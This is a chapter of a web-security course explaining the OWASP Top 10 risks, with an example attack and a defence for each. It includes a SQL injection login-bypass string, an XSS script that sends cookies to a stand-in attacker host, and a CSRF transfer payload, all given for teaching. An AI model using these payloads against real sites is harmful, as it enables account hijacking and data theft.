# 04 - Web Application Security (OWASP Top 10)

Most breaches that make the news start with a web application flaw. The **OWASP Top 10** is the industry's canonical list of the most critical web risks. This chapter walks each one in plain English, with a real attack and the exact fix.

**The master tool for web testing:** **Burp Suite** (intercepting proxy - lets you see and modify every request between browser and server). Free alternative: **OWASP ZAP**.

---

## 4.1 Injection (SQL Injection)

**What it is:** The app builds a command (like a database query) by gluing user input directly into it. The attacker types input that *becomes* part of the command, changing what it does.

**How the attack works:** A login form runs this query:
```sql
SELECT * FROM users WHERE email = 'INPUT_HERE' AND password = '...';
```
The attacker enters `' OR '1'='1` as the email. The query becomes:
```sql
SELECT * FROM users WHERE email = '' OR '1'='1' AND password = '...';
```
`'1'='1'` is always true → the query returns a user → login bypassed. Worse payloads dump the entire database (`UNION SELECT ...`) or delete tables.

**Real-world example:** SQL injection has caused some of history's largest breaches (e.g., the 2017 Equifax-era class of web flaws, countless retail breaches). It remains one of the most common and damaging web vulnerabilities.

**Real tools:** `sqlmap` (automates finding and exploiting SQLi), Burp Suite.

**How to prevent it (this is a *solved* problem):**
- **Use parameterized queries / prepared statements.** Never concatenate input into SQL. The database treats input as *data*, never as *code*.
  ```js
  // SAFE (parameterized) - Node.js example
  db.query('SELECT * FROM users WHERE email = $1', [userEmail]);
  // UNSAFE - never do this
  db.query(`SELECT * FROM users WHERE email = '${userEmail}'`);
  ```
- **Use an ORM** (Prisma, Sequelize, etc.) which parameterizes by default.
- **Least-privilege DB accounts** - the web app's DB user shouldn't be able to `DROP TABLE`.
- **Input validation** as a second layer (not a substitute for parameterization).

---

## 4.2 Cross-Site Scripting (XSS)

**What it is:** The attacker gets their JavaScript to run in *another user's* browser, on your site. That script can steal session cookies, log keystrokes, or impersonate the victim.

**Three types:**
- **Stored XSS** - malicious script saved in the database (e.g., in a comment) and served to everyone who views it. Most dangerous.
- **Reflected XSS** - script in a URL parameter, reflected back in the page; delivered via a malicious link.
- **DOM-based XSS** - happens entirely in the browser via unsafe JavaScript.

**How the attack works:** A comment box doesn't sanitize input. The attacker posts:
```html
<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```
Now every visitor's session cookie is sent to the attacker, who can hijack their accounts.

**How to prevent it:**
- **Escape/encode output** by context (HTML, attribute, JS, URL). Modern frameworks (React, Angular, Vue) auto-escape by default - *don't* defeat them with `dangerouslySetInnerHTML`/`v-html` on untrusted data.
- **Content Security Policy (CSP)** - a header telling the browser "only run scripts from these sources," which blocks injected inline scripts even if one slips through.
- **Set cookies `HttpOnly`** so JavaScript cannot read them (defeats cookie theft).
- **Sanitize rich HTML** with a vetted library (e.g., `DOMPurify`) when you must allow formatting.

---

## 4.3 Broken Authentication

Covered in depth in [Chapter 05](05-authentication.md). In short: weak passwords, no MFA, predictable session tokens, and credential-stuffing let attackers log in as your users. Fix with MFA, strong hashing, and rate limiting.

---

## 4.4 Broken Access Control (incl. IDOR)

**What it is:** The #1 risk on the current OWASP list. The app checks *who you are* but not *whether you're allowed to do this specific thing.*

**IDOR (Insecure Direct Object Reference) - the classic:** You view your invoice at:
```
https://app.com/invoice?id=1001
```
You change it to `id=1002` and see *someone else's* invoice. The server never checked that invoice 1002 belongs to you.

**Real-world example:** IDOR flaws have exposed millions of records at major companies - order histories, personal data, even other users' documents - simply by incrementing an ID in the URL.

**How to prevent it:**
- **Authorize every request server-side**, scoped to the logged-in user: `WHERE invoice.id = ? AND invoice.owner_id = currentUser`.
- **Deny by default.** Every endpoint requires an explicit "is this user allowed?" check.
- **Don't rely on hiding** admin URLs or on the UI not showing a button - the server must enforce it.
- Use **unguessable IDs** (UUIDs) as defense in depth, but *never* as the only control.

---

## 4.5 Cross-Site Request Forgery (CSRF)

**What it is:** The attacker tricks your logged-in browser into making a request you didn't intend. Because your browser auto-sends your cookies, the server thinks *you* did it.

**How the attack works:** You're logged into your bank. You visit a malicious page containing:
```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```
Your browser loads the "image," sending your bank cookies along → money transferred.

**How to prevent it:**
- **CSRF tokens** - a secret, per-session value the attacker can't know, required on state-changing requests.
- **`SameSite=Lax` or `Strict` cookies** - browsers won't send cookies on cross-site requests (now the default in modern browsers and a strong baseline defense).
- **Require re-authentication** for sensitive actions.

---

## 4.6 Security Misconfiguration

**What it is:** The software is fine; the setup is wrong. Default passwords, verbose error messages that leak stack traces, open cloud storage buckets, unnecessary features enabled, directory listing on.

**Real-world example:** Thousands of breaches trace to **public S3 buckets** - cloud storage left open to the world, exposing backups, customer data, and secrets. The software worked perfectly; someone just left the door open.

**How to prevent it:**
- **Harden by default.** Follow benchmarks like **CIS Benchmarks** for each system.
- **Disable directory listing, debug modes, and default accounts** in production.
- **Generic error messages** to users; detailed logs server-side only.
- **Automate config scanning** (see DevSecOps, Ch. 09) so misconfigs are caught before deploy.

---

## 4.7 Vulnerable & Outdated Components

**What it is:** Your app depends on hundreds of third-party libraries. One with a known vulnerability makes *you* vulnerable.

**Real-world example - Log4Shell (2021):** A flaw in **Log4j**, a ubiquitous Java logging library, let attackers run code on servers just by sending a crafted string (like in a chat message or user-agent). It affected millions of systems worldwide overnight. The "attack" was using a vulnerable component nobody realized they had.

**How to prevent it:**
- **Software Composition Analysis (SCA):** tools like `npm audit`, `Dependabot`, `Snyk`, `OWASP Dependency-Check` scan your dependencies for known CVEs.
- **Keep a Software Bill of Materials (SBOM)** - know exactly what you ship.
- **Patch fast.** Have a process to update critical libraries within hours, not months.

---

## 4.8 Other key risks on the list

- **Cryptographic Failures** - weak/misused encryption, secrets in plaintext. → See [Chapter 10](10-cryptography.md).
- **Insecure Design** - the flaw is in the architecture, not a bug. → Fix with threat modeling (Ch. 01).
- **Software & Data Integrity Failures** - trusting unverified updates or CI/CD artifacts. → Sign and verify. (Supply-chain attacks, Ch. 09.)
- **Security Logging & Monitoring Failures** - you can't respond to what you can't see. → See [Chapter 11](11-blue-team-ir.md).
- **Server-Side Request Forgery (SSRF)** - the server is tricked into making requests to internal systems. → Validate and allowlist outbound URLs.

---

## 4.9 Practice this legally

Spin up deliberately vulnerable apps and attack them yourself:
- **OWASP Juice Shop** - modern vulnerable web app (best starting point).
- **DVWA** (Damn Vulnerable Web App), **PortSwigger Web Security Academy** (free, excellent, by the Burp Suite makers).
- **bWAPP**, **WebGoat**.

➡️ Next: [05 - Authentication & Passwords](05-authentication.md)
